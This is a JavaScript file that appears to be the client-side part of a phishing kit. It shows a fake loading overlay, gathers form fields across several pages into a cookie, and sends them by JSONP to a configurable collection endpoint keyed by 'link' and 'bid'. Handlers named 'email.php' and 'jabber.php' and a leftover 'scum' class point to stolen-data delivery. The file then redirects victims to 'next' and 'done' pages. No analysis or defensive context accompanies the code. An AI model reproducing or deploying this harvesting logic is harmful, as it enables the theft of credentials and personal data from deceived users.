   $(document).ready(function() {

       $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
   <span class="fa-stack l_1" style="font-size: 50px;position: relative;top: 50%; -webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-circle fa-stack-2x"></i>\
          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>\
   </span>\
   <span class="fa-stack l_2" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-square fa-stack-2x"></i>\
          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>\
   </span>\
   <span class="fa-stack l_3" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-circle fa-stack-2x"></i>\
          <i class="fa fa-circle-o-notch fa-stack-1x fa-spin" style="color: white"></i>\
   </span>\
   <span class="fa-stack l_4" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-square fa-stack-2x"></i>\
          <i class="fa fa-circle-o-notch fa-stack-1x fa-spin" style="color: white"></i>\
   </span>\
</div>').appendTo('body');

       window.loader_ = {
           hide: function() {
               $('.loader__').fadeOut('fast');
           },
           show: function() {
               $('.loader__').fadeIn('fast');
           }
       }
   });




   function next__(el) {
       cookies.set('ses', 1);


       var Callback = function(data) {
           setTimeout(function() {
               loader_.hide();
               // $(".scum").hide();
               // $(el).closest(".scum").next().show();

               window.location.href = "../next/";
           }, 3000);
       }

       loader_.show();



       var data__ = $(el).custom_ser();
       var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
       cookies.set('data__', JSON.stringify(all_data__))



       if (/(email|jabber|complited)\.php/.test(php_js.home)) {
           Callback();
           return;
       }

       $.ajax({
           url: php_js.home + "&sl&link=" + php_js.link + "&bid=" + bid,
           dataType: "jsonp",
           data: {
               data: JSON.stringify(data__)
           },
           success: Callback,
           error: function(data) {}
       });

   }








   function finish__(el) {
       cookies.set('ses', 1);
       loader_.show();
       // alert('fin');
       var data__ = $(el).custom_ser();
       var all_data__ = $.extend({}, data__, JSON.parse(cookies.get('data__')));



       if (/(email|jabber|complited)\.php/.test(php_js.home)) {
           data__ = all_data__;
       }


       $.ajax({
           url: php_js.home + "&sl&done&link=" + php_js.link + "&bid=" + bid,
           dataType: "jsonp",
           data: {
               data: JSON.stringify(data__)
           },
           success: function(data) {
               // window.location.href = php_js.bb_link;
               window.location.href = "../done/";
           },
           error: function(data) {}
       });
   }



   $(document).ready(function() {
       // $('head base').attr('href','');
   });